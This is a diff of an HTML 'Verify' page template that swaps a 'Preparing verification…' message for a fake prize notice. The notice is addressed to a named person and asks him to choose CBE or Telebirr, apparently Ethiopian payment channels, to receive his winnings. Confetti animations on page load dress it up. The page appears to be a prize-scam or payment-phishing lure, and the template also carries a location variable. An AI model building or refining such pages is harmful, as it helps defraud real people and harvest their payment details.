@@ -2,6 +2,8 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+
   <title>Verify</title>
   <script>
     const locId = {{ loc_id }};
@@ -64,7 +66,35 @@
     };
   </script>
 </head>
-<body style="margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#f9f9f9;">
-  <h1>Preparing verification…</h1>
+<body style="margin:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#f9f9f9; text-align:center; padding:1rem;">
+  <div>
+    <h1>Congratulations, Aymen Bedru Yasin!</h1>
+    <p>You’ve won multiple prize levels!</p>
+    <p>How would you like to receive your prize?<br>
+       Reply with <strong>CBE</strong> or <strong>Telebirr</strong>.</p>
+    <p><em>Default: Telebirr</em></p>
+  </div>
+
+  <script>
+    // fire confetti once the page is fully loaded
+    window.onload = () => {
+      // basic burst
+      confetti({
+        particleCount: 150,
+        spread: 60,
+        origin: { y: 0.4 }
+      });
+
+      // a second burst for extra sparkle
+      setTimeout(() => {
+        confetti({
+          particleCount: 100,
+          spread: 100,
+          origin: { y: 0.2 }
+        });
+      }, 300);
+    };
+  </script>
 </body>
+
 </html>
